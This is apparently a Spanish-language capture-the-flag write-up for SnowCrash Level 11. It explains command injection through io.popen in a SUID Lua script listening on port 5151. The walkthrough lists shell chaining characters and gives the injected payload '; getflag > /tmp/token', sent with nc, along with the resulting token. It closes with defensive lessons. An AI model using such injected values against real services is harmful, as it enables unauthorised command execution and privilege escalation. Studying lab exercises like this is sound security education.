# SnowCrash - Level 11: Inyección de Comandos en Lua (io.popen)

Este repositorio documenta la resolución del **Nivel 11**. El reto demuestra cómo el uso de funciones que invocan la shell del sistema (`io.popen`, `os.execute`, `system()`) sin sanear las entradas del usuario puede llevar a la ejecución de código remoto (RCE).

## 1. Análisis del Entorno

Encontramos un script de Lua con permisos especiales:

```bash
ls -l level11.lua
# -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

```

### El Bit SUID en Scripts

Es importante notar que el archivo pertenece al usuario **`flag11`** y tiene el bit **SUID** activado. Esto significa que el proceso de Lua se ejecuta con los privilegios de `flag11`, lo cual es crítico para que `io.popen` herede dicho contexto de seguridad.

---

## 2. Análisis de la Vulnerabilidad

El código fuente contiene una función llamada `hash(pass)` con una vulnerabilidad crítica:

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  -- ...
end

```

### El Fallo: Concatenación de Comandos

El script toma la variable `pass` (recibida directamente del socket TCP) y la concatena mediante el operador `..` dentro de una cadena de comando.

1. **¿Qué hace `io.popen`?** Esta función abre una tubería (pipe) hacia o desde un proceso derivado (child process). En la práctica, invoca `/bin/sh` para ejecutar la cadena que se le pasa.
2. **El problema del filtrado:** No existe ninguna validación ni "escaping" de caracteres especiales. En Unix, ciertos caracteres permiten encadenar comandos en una sola línea:
* `;` : Ejecuta el siguiente comando tras terminar el anterior.
* `&&` : Ejecuta el siguiente solo si el anterior tuvo éxito.
* `|` : Envía la salida de uno a la entrada de otro.
* ``` o `$()` : Sustitución de comandos.



---

## 3. Estrategia de Explotación

El servidor escucha en el puerto `5151` de `localhost`. Nuestra meta es inyectar un comando que nos dé el flag.

### Construcción del Payload

Si enviamos como contraseña `; getflag > /tmp/token`, la cadena que se ejecuta en la shell se convierte en:

```bash
echo ; getflag > /tmp/token | sha1sum

```

**Desglose de la ejecución:**

1. `echo ;` -> Ejecuta un eco vacío (sin efecto dañino).
2. `getflag > /tmp/token` -> **Aquí está el exploit.** Ejecuta `getflag` con privilegios de `flag11` y redirige la salida a un archivo en `/tmp` donde tenemos permisos de lectura.
3. `| sha1sum` -> Intenta calcular el hash de la nada (fallará o dará un error de pipe, pero para entonces el comando anterior ya se habrá ejecutado).

---

## 4. Ejecución y Resolución

1. **Conexión al servicio:**
```bash
nc 127.0.0.1 5151

```


2. **Inyección:**
```text
Password: ; getflag > /tmp/token

```


3. **Recuperación del flag:**
```bash
cat /tmp/token
# Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s

```

---

## 5. Conclusiones Técnicas

* **Principio de Menor Privilegio:** Los scripts que requieren SUID deben ser extremadamente cuidadosos al invocar procesos externos.
* **Sanitización:** Nunca se debe confiar en la entrada del usuario. En lugar de `io.popen`, se deberían usar librerías que permitan pasar argumentos de forma aislada sin invocar una shell intermedia (`sh -c`).
* **Vulnerabilidades de Red:** Un servicio expuesto en un puerto local puede ser la puerta de entrada a una escalada de privilegios si el procesado de datos es inseguro.

---